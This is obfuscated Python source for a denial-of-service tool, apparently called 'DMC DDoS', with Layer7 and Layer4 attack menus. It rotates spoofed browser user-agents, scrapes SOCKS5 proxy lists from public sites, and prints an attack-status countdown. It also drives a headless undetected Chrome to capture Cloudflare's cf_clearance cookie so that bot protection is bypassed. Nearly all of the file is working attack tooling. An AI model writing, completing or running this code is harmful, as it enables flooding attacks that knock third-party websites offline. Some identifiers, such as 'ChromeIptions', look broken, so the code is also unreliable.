_IlIIllIIIlllIllll ='github   '
_IIlIlIlIllIIlIIll =' Plz star project :)                    '
_IlIlIIlIlIllIIIll ='YOU♥     '
_IllIllIlIIIlIIIll ='THANK    '
_IIIlIIIIllIlIlIII ='╠═════════════════════════════════════════════════════╣\n'
_IlIlIlIlIllIlIIlI =' Exit DMC DDoS                       '
_IIllIIlIlIlIlIlIl ='exit     '
_IIllIlllIllIllIll =' Show credit                            '
_IIlIIIIIIllllIIII ='credit   '
_IlIllIIllIIIlllll =' Show tools                             '
_IllIlIIIIlIlIllll ='tools    '
_IllIlIlIlllIIIIll =' Show Layer4 Methods                    '
_IlIIIIIIIIlllIlll ='layer4   '
_IllIlIlIlIllIIIlI =' Show Layer7 Methods                    '
_IlIlIlIIllIIlIIII ='layer7   '
_IIlIIIlIllIIlIIIl ='same-origin'
_IlIllllIIllIlIllI ='keep-alive'
_IllllIlllllllllIl ='deflate, gzip;q=1.0, *;q=0.5'
_IIllIIIIllIIIIllI ='tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'
_IIllIlllIlIlIIlII ='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
_IllIIIIIlIlllIlll ='Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
_IlIIlllIIllllIllI ='Sec-Fetch-User'
_IllIIlllIlllllIlI ='Sec-Fetch-Site'
_IIlllIlIllIIIIlIl ='Sec-Fetch-Mode'
_IlllllIIlIlllllIl ='Sec-Fetch-Dest'
_IlIllIlIIlIIlIIIl ='Upgrade-Insecure-Requests'
_IllIlIlIIIIIIllll ='Connection'
_IlllllIlIIlIIlIII ='Cache-Control'
_IllIIIIIlIIlllIIl ='Accept-Encoding'
_IlIIIlIllIIIIlllI ='Accept-Language'
_IllIIIIllIllIllIl ='Accept'
_IlIIlIlIIIIllIlll ='User-Agent'
_IlIlIIllIIllllIlI =':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK'
_IlIIlIllIIIIlIIlI ='Host: '
_IIIIllIIIlIIllIII =' HTTP/1.1\r\n'
_IlIIIIIIlIIllIIll ='TIME(s)  '
_IlIIIlllIIIIIlllI ='THREAD   '
_IllIIlIIllIllIlII ='Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0'
_IlIlIIllIlIIlIIlI ='Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7'
_IlllIllIIIIIIlIIl ='Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15'
_IIllIlIlIllIllIlI ='Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9'
_IlIlllIlIlIllIIlI =' HTTP/1.1\r\nHost: '
_IIllIIIlIlIIIlIlI ='http://'
_IlllIIlIllllllIIl ='name'
_IlllIIlIlIIIIIlII ='HEAD'
_IIllIIIIlIIlIIlll ='./socks5.txt'
_IIIIIlIlllIIlIIII ='no-cache'
_IIIllllllIIlIlIII ='\x06\x00/\x00\x00\x00\x02\x0c\x00'
_IlllIllIIIllIIlIl ='./http.txt'
_IlIlIIllIIIlIllII ='╚═════════════════════════════════════════════════════╝\n'
_IIIllIIIlIlIlIIll ='╔═════════╩═════════════════════════════════╩═════════╗\n'
_IllIIllIlllIIIIII ='        ══╦═════════════════════════════════╦══\n'
_IlIllIIIIIIIIlIIl ='                                                                                         \n'
_IIIIlIIlllllIllII =' / HTTP/1.1\r\nHost: '
_IIlIlIIllllllIlIl =False 
_IlIlllllIIlIlIllI ='scheme'
_IllllIIlIlIIlIlll ='Upgrade-Insecure-Requests: 1\r\n'
_IllIlIllIlllllllI ='Sec-Fetch-Dest: document\r\n'
_IIIllllllIllllIII ='Sec-Fetch-Mode: navigate\r\n'
_IlIIIlIIIIIIIIIIl ='Sec-GPC: 1\r\n'
_IIlIIIllIIlIIllIl ='Sec-Fetch-Site: same-origin\r\n'
_IllIlIIlIIIlIIlIl ='Cache-Control: no-cache\r\n'
_IlIIlIlIlIllllIIl ='https'
_IllllIIIIIIIllIll ='\x1b[38;2;255;20;147m • '
_IIllIIIllIlIIlIll ='r'
_IlIlIIllllIIllIIl ='uri'
_IlIIlIllIIIllIIlI =True 
_IIIlllIlllIlIllll ='Connection: Keep-Alive\r\n\r\n'
_IIIIlIlIlIlllIIll =':'
_IllllIlIlIlIIlIIl ="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
_IIllIllIIIIllIlIl ='port'
_IIllIIIlIIlIIlIII ='\n'
_IIlllIlIlIIIIllIl ='host'
_IllllIlIlIIlIIIII ='                   '
_IlIIIIlllIlllllll ='|'
_IllIIIlllllllllll ='║ \x1b[38;2;255;20;147m• '
_IIllIlIllIIIllIll ='\r\n'
_IIIlIlIllIIlllllI ='║\n'
_IIllIllIIIllllllI =': '
_IlIlIlllllIIIIIIl ='             '
from os import system ,name 
import httpx ,undetected_chromedriver as webdriver 
from httpx import AsyncClient ,Headers 
import os ,threading ,requests ,cloudscraper ,datetime ,time ,socket ,ssl ,random ,socket ,socket 
from urllib .parse import urlparse 
from requests .cookies import RequestsCookieJar 
import undetected_chromedriver as webdriver 
from sys import stdout 
from colorama import Fore ,init 
from sys import argv 
from threading import Thread 
init (convert =_IlIIlIllIIIllIIlI )
def IIIllIlIlIllIlIlI (IlllIllIIllIlIllI ):
	IIllIllllIllIllll ='[*]';IlIlIIlIllIllIIII ='\r ';IllIIIIIlllIlIIll =datetime .datetime .now ()+datetime .timedelta (seconds =int (IlllIllIIllIlIllI ))
	while _IlIIlIllIIIllIIlI :
		if (IllIIIIIlllIlIIll -datetime .datetime .now ()).total_seconds ()>0 :stdout .flush ();stdout .write (IlIlIIlIllIllIIII +Fore .MAGENTA +IIllIllllIllIllll +Fore .WHITE +' Attack status => '+str ((IllIIIIIlllIlIIll -datetime .datetime .now ()).total_seconds ())+' sec left ')
		else :stdout .flush ();stdout .write (IlIlIIlIllIllIIII +Fore .MAGENTA +IIllIllllIllIllll +Fore .WHITE +' Attack Done !                                   \n');return 
IIlIIllllllIIIlIl =['Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1','Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1','Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1','Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0','Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0','Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/2l12l4l32115l7 Firefox/12.0','Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0','Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)','Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2ll9l42316 Firefox/3.0.10','Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)','Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9','Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2ll9l6l215 Firefox/3.0.11 (.NET CLR 3.5.30729)','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5','Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2ll8l72421 Minefield/3.0.2pre','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20','Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a','Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2','Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0','Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34','Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1','Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2','Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1','Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1','Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1','Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ','Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1','Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre','Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0','Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2','Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0','Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5','Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre','Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1','Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2','Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1','Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre','Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0','Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1','Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0','Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8','Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0','Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15','Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko','Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16','Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025','Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1','Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020','Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1','Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)','Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher','Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian','Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8','Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8','Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5','Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2ll9l6l3l9 Ubuntu/9.10 (karmic) Firefox/3.0.11','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330','Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)','Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8','Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0','Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',_IIllIlIlIllIllIlI ,_IlllIllIIIIIIlIIl ,_IlIlIIllIlIIlIIlI ,_IllIIlIIllIllIlII ,'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2ll8l92814 (Debian-3.0.1-1)','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9','Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12','Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0','Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15','Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0','Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3','Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5','Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8','Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3','Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',_IIllIlIlIllIllIlI ,_IlllIllIIIIIIlIIl ,_IlIlIIllIlIIlIIlI ,_IllIIlIIllIllIlII ,'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(lx26l6l135) NetType/WIFI Language/zh_CN','Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(lx26l6l135) NetType/4G Language/zh_CN','Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(lx26l6l135) NetType/WIFI Language/zh_CN','Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(lx26l6l135) NetType/WIFI Language/zh_CN','Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(lx26l6l135) NetType/4G Language/zh_CN','Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN','Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN','Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN','Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(lx26l6l135) NetType/WIFI Language/zh_CN']
IllIlIlIIlllllllI =['GET','POST',_IlllIIlIlIIIIIlII ]
IlIIIIlllIlIlllII =['https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all','https://www.proxy-list.download/api/v1/get?type=socks5','https://www.proxyscan.io/download?type=socks5','https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt']
IIlIIlllIIIlIIlII ='socks5.txt'
def IIllllIlIIIlIlIlI ():
	global IIlIIlllIIIlIIlII ,IIIlllllIllIlIIll ;IIIlIlIIIIIIllllI =open (IIlIIlllIIIlIIlII ,'wb')
	for IIIIIIIIIIIIlIIlI in IlIIIIlllIlIlllII :
		try :IIIlIlIIIIIIllllI .write (requests .get (IIIIIIIIIIIIlIIlI ).content )
		except :pass 
	IIIlIlIIIIIIllllI .close ()
def IlIIIlIIllIIllIIl (IllIIIIIIIlIIllII ):
	IllIIIIIIIlIIllII =IllIIIIIIIlIIllII .rstrip ();IIlIIIlIlIIIlIlll ={};IIlIIIlIlIIIlIlll [_IlIlIIllllIIllIIl ]=urlparse (IllIIIIIIIlIIllII ).path 
	if IIlIIIlIlIIIlIlll [_IlIlIIllllIIllIIl ]=='':IIlIIIlIlIIIlIlll [_IlIlIIllllIIllIIl ]='/'
	IIlIIIlIlIIIlIlll [_IIlllIlIlIIIIllIl ]=urlparse (IllIIIIIIIlIIllII ).netloc ;IIlIIIlIlIIIlIlll [_IlIlllllIIlIlIllI ]=urlparse (IllIIIIIIIlIIllII ).scheme 
	if _IIIIlIlIlIlllIIll in urlparse (IllIIIIIIIlIIllII ).netloc :IIlIIIlIlIIIlIlll [_IIllIllIIIIllIlIl ]=urlparse (IllIIIIIIIlIIllII ).netloc .split (_IIIIlIlIlIlllIIll )[1 ]
	else :IIlIIIlIlIIIlIlll [_IIllIllIIIIllIlIl ]='443'if urlparse (IllIIIIIIIlIIllII ).scheme ==_IlIIlIlIlIllllIIl else '80'
	return IIlIIIlIlIIIlIlll 
def IllIIIIllIIIlIIll ():
	global IlllIIllIIlIIllII 
	if not os .path .exists (_IlllIllIIIllIIlIl ):stdout .write (Fore .MAGENTA +' [*]'+Fore .WHITE +' You Need Proxy File ( ./http.txt )\n');return _IIlIlIIllllllIlIl 
	IlllIIllIIlIIllII =open (_IlllIllIIIllIIlIl ,_IIllIIIllIlIIlIll ).read ().split (_IIllIIIlIIlIIlIII );return _IlIIlIllIIIllIIlI 
def IlIlIIIlllIllIlll (IIIIlIlllIIIlIIlI ):
	global IlIllllIIlIIlIIII ,IllIllllIIlIIIlll ,IIlIIIIIIlllIIlll ;IIlIlIlIIlIlIIllI =webdriver .ChromeIptions ();IllIIlIlIIIlIllll =['--no-sandbox','--disable-setuid-sandbox','--disable-infobars','--disable-logging','--disable-login-animations','--disable-notifications','--disable-gpu','--headless','--lang=ko_KR','--start-maxmized','--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en']
	for IIlllIllllIlIIllI in IllIIlIlIIIlIllll :IIlIlIlIIlIlIIllI .add_argument (IIlllIllllIlIIllI )
	IIllIllIIlIlIlllI =webdriver .Chrome (options =IIlIlIlIIlIlIIllI );IIllIllIIlIlIlllI .implicitly_wait (3 );IIllIllIIlIlIlllI .get (IIIIlIlllIIIlIIlI )
	for _IIlIlIIlIIllIlIll in range (60 ):
		IlIllIIlIIIIIllll =IIllIllIIlIlIlllI .get_cookies ();IIllIlIlllIllllIl =0 
		for IIIIlIIIlIllIIlII in IlIllIIlIIIIIllll :
			if IIIIlIIIlIllIIlII [_IlllIIlIllllllIIl ]=='cf_clearance':IllIllllIIlIIIlll =IIllIllIIlIlIlllI .get_cookies ()[IIllIlIlllIllllIl ];IlIllllIIlIIlIIII =IIllIllIIlIlIlllI .execute_script ('return navigator.userAgent');IIlIIIIIIlllIIlll =f"{IllIllllIIlIIIlll[_IlllIIlIllllllIIl]}={IllIllllIIlIIIlll['value']}";IIllIllIIlIlIlllI .quit ();return _IlIIlIllIIIllIIlI 
			else :IIllIlIlllIllllIl +=1 
		time .sleep (1 )
	IIllIllIIlIlIlllI .quit ();return _IIlIlIIllllllIlIl 
